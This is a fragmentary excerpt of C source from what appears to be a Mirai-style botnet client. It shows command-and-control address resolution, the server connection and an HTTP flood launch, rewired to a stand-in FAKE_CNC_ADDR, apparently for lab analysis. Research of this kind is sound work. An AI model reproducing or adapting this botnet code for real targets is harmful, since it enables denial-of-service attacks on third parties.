...
#endif
    	    a_target *targs = (a_target *) malloc(sizeof(a_target));
            targs->addr = FAKE_CNC_ADDR;
            targs->netmask = 24;

            attack_app_http(1, targs, 0, NULL);
...
static void resolve_cnc_addr(void)
{
    ...
    //entries = resolv_lookup("localhost");
    ...
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;//entries->addrs[rand_next() % entries->addrs_len];
    //resolv_entries_free(entries);

    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = htons(FAKE_CNC_PORT);//*((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
...
static void establish_connection(void)
{
    ...
    int val = connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
    if (val == -1)
